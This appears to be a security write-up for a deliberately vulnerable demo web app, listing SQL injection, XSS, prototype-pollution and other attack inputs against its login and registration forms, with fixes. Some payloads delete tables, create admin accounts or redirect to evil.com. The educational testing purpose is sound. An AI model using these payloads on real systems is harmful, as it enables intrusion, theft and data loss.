# Demo App Vulnerability Analysis

This document outlines the various inputs that will cause unexpected behavior in the login and registration functionality of this intentionally vulnerable demo application.

## Critical Input Vulnerabilities

### 1. SQL Injection Attacks

#### Login Form
- **Username field**: `admin' OR '1'='1' --`
  - Bypasses authentication by making the SQL query always true
  - Can be combined with any password to gain access

- **Username field**: `'; DROP TABLE users; --`
  - Could potentially delete the entire users table
  - Exploits the direct string concatenation in SQL queries

#### Registration Form
- **Username field**: `test'; INSERT INTO users (username, email, password, role) VALUES ('hacker', 'hack@evil.com', 'hash', 'admin'); --`
  - Could inject malicious data into the database
  - Potentially creates admin accounts

#### Search Function
- **Search query**: `' UNION SELECT password, email FROM users --`
  - Exposes password hashes and sensitive data
  - Combines results from multiple tables

### 2. Authentication Bypass

#### Weak Password Validation
- **Password field**: `12` or `ab` 
  - Accepts passwords as short as 3 characters
  - No complexity requirements (no numbers, symbols, etc.)

#### Email Validation Issues
- **Email field**: `not@email` or `fake@`
  - Accepts malformed email addresses
  - Only checks for presence of `@` symbol

### 3. Information Disclosure

#### Login Error Messages
- **Non-existent username**: Returns "User not found"
- **Valid username + wrong password**: Returns "Invalid password"
- **Deactivated account**: Returns "Account is deactivated"
  - These different messages allow attackers to enumerate valid usernames

### 4. XSS and Content Injection

#### Profile Data Field (Registration)
```javascript
<script>alert('XSS')</script>
{"name": "<img src=x onerror=alert('XSS')>"}
```
- Accepts and stores malicious JavaScript
- No input sanitization or output encoding

#### Username/Email Fields
```html
<script>document.location='http://evil.com'</script>
admin<script>alert('XSS')</script>
```

### 5. No Rate Limiting

#### Brute Force Attacks
- Unlimited login attempts allowed
- No account lockout mechanism
- No CAPTCHA or throttling

### 6. Session Vulnerabilities

#### Session Configuration Issues
- Weak session secret: `demo-secret-key`
- `httpOnly: false` - allows XSS access to cookies
- `secure: false` - transmits cookies over HTTP
- Excessive session duration (24 hours)

### 7. JSON Injection in Profile Data

#### Profile Data Field
```json
{"__proto__": {"admin": true}}
{"constructor": {"prototype": {"role": "admin"}}}
```
- Could potentially lead to prototype pollution
- Malformed JSON could crash the application

### 8. Parameter Pollution

#### Multiple Parameter Values
```
username=user1&username=admin
password=wrong&password=correct
```

### 9. Unicode and Encoding Attacks

#### Username/Email Fields
```
admin%00
admin\x00
admin\u0000
üser (Unicode normalization)
```

### 10. Length-based Attacks

#### Extremely Long Inputs
- Very long usernames (>1000 characters)
- Very long emails (>1000 characters)
- Very long profile data (>10000 characters)

## Example Attack Payloads

### Complete SQL Injection Login
```
Username: admin' OR '1'='1' --
Password: anything
```

### Registration with Malicious Profile
```
Username: normaluser
Email: test@example.com
Password: password123
Profile Data: {"name": "<script>fetch('/admin/users').then(r=>r.json()).then(d=>console.log(d))</script>"}
```

### Account Enumeration
```
Username: admin (returns "Invalid password")
Username: nonexistentuser123 (returns "User not found")
```

## Code Locations of Vulnerabilities

### SQL Injection Vulnerabilities
- **File**: `server.js`
- **Lines**: 76-77 (registration check), 108-109 (insert), 131-133 (login), 217 (dashboard), 284 (search)
- **Issue**: Direct string concatenation in SQL queries without parameterization

### Weak Validation Functions
- **File**: `server.js`
- **Lines**: 33-36 (email validation), 38-41 (password validation)
- **Issue**: Extremely weak validation logic

### Session Security
- **File**: `server.js`
- **Lines**: 17-27
- **Issue**: Multiple session configuration vulnerabilities

### Input Sanitization
- **File**: `server.js`
- **Lines**: 43-47
- **Issue**: Incomplete and ineffective sanitization

## Testing Recommendations

1. **Automated Security Testing**: Use tools like OWASP ZAP or Burp Suite to test for SQL injection and XSS
2. **Manual Testing**: Try all the payloads listed above
3. **Fuzzing**: Use fuzzing tools to test with random/malformed inputs
4. **Load Testing**: Test with high volumes of requests to identify rate limiting issues
5. **Authentication Testing**: Test session handling and authentication bypass techniques

## Remediation Notes

⚠️ **Important**: This application contains intentional security vulnerabilities for educational testing purposes. Do not use any of this code in production environments.

For learning purposes, consider how each vulnerability could be fixed:
- Use parameterized queries for SQL injection prevention
- Implement proper input validation and sanitization
- Add rate limiting and account lockout mechanisms
- Configure secure session settings
- Implement proper error handling without information disclosure
- Add CSRF protection
- Use HTTPS in production
- Implement proper logging and monitoring